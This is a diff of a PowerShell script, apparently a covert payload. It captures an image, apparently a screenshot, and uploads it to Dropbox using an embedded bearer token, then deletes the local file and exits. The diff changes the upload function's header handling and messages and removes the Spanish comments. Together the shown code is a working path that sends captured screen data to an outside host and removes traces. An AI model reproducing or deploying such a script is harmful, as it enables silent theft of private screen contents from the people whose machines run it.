@@ -7,33 +7,28 @@
 #   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
  #########################################################################################################################           
 
-$db = ""  # Token de autorización para Dropbox
+$db = ""
 
 # Función para subir un archivo a Dropbox
 function DropBox-Upload {
     param (
         [string]$SourceFilePath
     )
-    
+
     try {
         $outputFile = Split-Path $SourceFilePath -leaf
         $TargetFilePath = "/$outputFile"
         $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
         $authorization = "Bearer " + $db
-        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-        $headers.Add("Authorization", $authorization)
-        $headers.Add("Dropbox-API-Arg", $arg)
-        $headers.Add("Content-Type", 'application/octet-stream')
-        
-        # Realizar la solicitud para subir el archivo
+        $headers = @{
+            "Authorization" = $authorization
+            "Dropbox-API-Arg" = $arg
+            "Content-Type" = 'application/octet-stream'
+        }
         $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-        
-        # Mostrar información de la respuesta
-        Write-Output "Archivo '$outputFile' subido correctamente a Dropbox."
-        Write-Output "Respuesta de Dropbox: $($response | ConvertTo-Json)"
-    }
-    catch {
-        Write-Output "Error al subir el archivo a Dropbox: $_"
+        Write-Output "Upload successful: $($response.path_display)"
+    } catch {
+        Write-Error "Failed to upload file to Dropbox: $_"
     }
 }
 
@@ -54,4 +49,7 @@ $bitmap.Dispose()
 DropBox-Upload -SourceFilePath $filePath
 
 # Eliminar el archivo temporal
-Remove-Item -Path $filePath -ErrorAction SilentlyContinue
+Remove-Item -Path $filePath
+
+# Salir del script
+exit
